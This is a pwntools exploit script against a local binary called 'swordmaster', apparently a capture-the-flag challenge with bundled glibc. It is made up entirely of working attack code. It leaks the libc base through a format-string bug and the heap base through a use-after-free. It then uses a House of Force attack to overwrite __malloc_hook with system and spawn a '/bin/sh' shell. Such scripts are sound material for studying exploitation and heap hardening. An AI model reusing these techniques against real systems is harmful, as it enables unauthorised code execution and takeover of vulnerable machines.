from pwn import *
import sys
if not sys.warnoptions:
    import warnings
    warnings.simplefilter("ignore")

elf = ELF("./swordmaster")
libc = ELF("./glibc/libc.so.6")
p = elf.process(['./glibc/ld-linux-x86-64.so.2','./swordmaster'],env={"LD\_PRELOAD":"./glibc/libc.so.6"})

# ---- SET NAME ----
p.sendline('/bin/sh\0')

# ---- LEAK LIBC BASE WITH FORMAT STRING BUG ----
p.recvuntil(b'>> ')
p.sendline(b'%13$p')
p.recvuntil('There is no ')

libc_leak = p.recvline().split(b' ')[0]
libc_leak = int(libc_leak[2:], 16)
libc.address = libc_leak - 0x21c87

log.info("LEAKED LIBC BASE: " + hex(libc.address))


# ---- LEAK HEAP BASE WITH UAF BUG -------
p.recvuntil(b'>> ')
p.sendline(b'5')
p.recvuntil(b'>> ')
p.sendline(b'3')
p.recvuntil(b'Class: ')

heap = p.recvline()[:-1]
heap = int.from_bytes(heap, 'little') - 4800 - 0x10

log.info("LEAKED HEAP BASE: " + str(hex(heap)))

def malloc(size, data):
    p.recvuntil(b'>> ')
    p.sendline(b'1')
    p.recvuntil(b'>> ')
    p.sendline(str(size))
    p.recvuntil(b'>> ')
    p.sendline(data)



# ---- House Of Force Set-Up ----
malloc(40, b'\x41'*47)

# ---- Point top chunk to __malloc_hook ----
distance = libc.sym.__malloc_hook - (heap + 0x1330) - 0x10
malloc(distance, 'dummy')

# ---- Overwrite __malloc_hook with system ----
malloc(24, p64(libc.sym.system))

# ---- Point cmd at our name (/bin/sh) and call malloc to execute our overwritten hook ----
cmd = heap + 0x1270
p.recvuntil(b'>> ')
p.sendline(b'1')
p.recvuntil(b'>> ')
p.sendline(str(cmd))

p.interactive()
